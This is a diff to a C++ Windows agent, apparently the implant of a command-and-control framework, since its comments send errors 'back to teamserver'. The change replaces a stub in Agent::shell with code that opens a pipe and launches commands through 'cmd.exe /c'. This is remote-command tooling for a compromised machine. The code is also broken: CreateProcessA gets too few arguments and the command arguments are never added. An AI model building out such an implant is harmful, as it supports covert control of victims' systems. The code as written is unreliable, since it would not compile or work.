@@ -32,12 +32,38 @@ void Agent::shell(std::vector<std::string> args) {
 		return;
 	}
 
-	for (std::vector<std::string>::iterator t = args.begin(); t != args.end(); ++t) {
-		std::cout << *t << std::endl;
+
+
+
+	HANDLE hRead, hWrite;
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi = { 0 };
+	SECURITY_ATTRIBUTES saAttr;
+
+	ZeroMemory(&saAttr, sizeof(saAttr));
+
+	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+	saAttr.bInheritHandle = TRUE;
+	saAttr.lpSecurityDescriptor = NULL;
+
+	if (!CreatePipe(&hRead, &hWrite, &saAttr, 0)) {
+		//Post(RETURN_URL, GetLastError());
+		return;// send error back to teamserver
+	}
+	std::string cmd = "cmd.exe /c ";
+
+	if (!CreateProcessA(NULL, cmd.c_str())) {
+		//Post(RETURN_URL, GetLastError());// send error back to teamserver
+		CloseHandle(hRead);
+		CloseHandle(hWrite);
+		return;
 	}
 
-	std::cout << "Testing 123" << std::endl;
+
+
+
 }
+
 
 void Agent::powershell(std::vector<std::string> args) {
 
